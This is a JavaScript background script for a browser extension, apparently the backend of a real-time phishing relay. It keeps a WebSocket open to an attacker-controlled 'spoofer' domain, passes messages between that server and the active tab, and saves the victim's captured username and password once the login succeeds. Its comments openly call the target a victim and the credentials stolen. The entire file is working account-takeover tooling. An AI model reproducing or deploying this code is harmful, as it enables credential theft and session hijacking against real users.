// The following variables are injected at runtime by the bash startup
// script that launches the docker container that runs this extension
// 
// var ATTACK_DOM = ""; injected by docker.py (domain name of spoofer)
// var BID = "";        injected
                 
var finished = false;

function connect() {
    console.log("connecting to websocket");
    var alive = true;
    var ws = new WebSocket("wss://" + ATTACK_DOM + ":80/")

    // Make sure socket receives appropriate pong requests. Otherwise, 
    // kill it. This will cause a reconnect if this session wasn't successful.
    var pingInterval;
    ws.onopen = function(event) {
        pingInterval = setInterval(function() {
            if (!alive) {
                clearInterval(pingInterval);
                if (!finished)  ws.close(4002);     // session timed out
                //else            ws.close(1001);     // success
            }
            else {
                if (!finished) 
                    ws.send(JSON.stringify({
                        "ping": BID, 
                        "time": "" + new Date().getTime()
                    }));
                alive = false;
            }
        }, 4000);
        ws.send(JSON.stringify({
            "auth" : "Backend " + BID + " connected!", 
        }));
    }
    ws.onmessage = function(event) {
        msg = JSON.parse(event.data);

        // If message is pong, keep socket alive
        if (msg.pong != undefined) {
            alive = true;       
            return;
        }

        // If message is not pong, relay it to all tab content scripts
        browser.tabs.query({
            currentWindow: true,
            active: true
        })
        .then(function(tabs) {
            for (let tab of tabs) browser.tabs.sendMessage(tab.id, msg);
        });
    }
    ws.onerror = function(event) {
        console.log("ERROR:");
        console.log(event);
    }
    // Clear intervals and try to reconnect if not succeeded yet
    ws.onclose = function(event) {
        clearInterval(pingInterval);
        console.log("lost connection... trying to reconnect");
        console.log(event);
        setTimeout(function() {
            if (!finished) {
                console.log("reconnecting now");
                connect();
            }
        }, 500);
    }
    window.ws = ws;
}

// When background runtime receives a message from an active tab
// Relay this message to the socket server (who probably relays
// it to the victim in some form)
browser.runtime.onMessage.addListener(function(msg, sender) {
    console.log("Sending message:");
    console.log(msg);

    // @deprecated (no need for this)
    if (msg.local == "removeTab") {
        browser.tabs.remove(sender.tab.id);     
        console.log('remvoning tab')
    }
    else {
        msg.id = "backend";
        msg.bid = BID;
        
        // If websocket is not ready, desperately try to make it ready
        // and desperately try to send until complete
        if (!finished && (window.ws == undefined || window.ws.readyState != 1)) {
            console.log("Websocket not ready! oh no. Restarting it...");
            connect();
            function trySend() {
                setTimeout(()=>{
                    if (window.ws.readyState == 1) {
                        window.ws.send(JSON.stringify(msg));
                    }
                    else {
                        console.log("still not ready. try again");
                        trySend();
                    }
                }, 500);
            }
        }
        // If websocket is ready, send the message to server
        else {
            if (!finished) window.ws.send(JSON.stringify(msg));
            console.log("Sent message");
        }

        // If the message is that the victim logged in succesfully in 
        // this docker container, clean up this operation
        if (msg.status == "loggedIn") {
            console.log("Setting local storage");
            finished = true;
            browser.storage.local.set({"user" : msg.user});
            browser.storage.local.set({"pass" : msg.pass});
            window.ws.close(1000)
            //window.ws = undefined;
        }

    }
});

// Check if this machine has successfully stolen a victim's credential
// already. If not, try to connect to spoofer's socket server 
browser.storage.local.get("user", function(result) {
    if (result.user == undefined || result.user == "") connect();
});
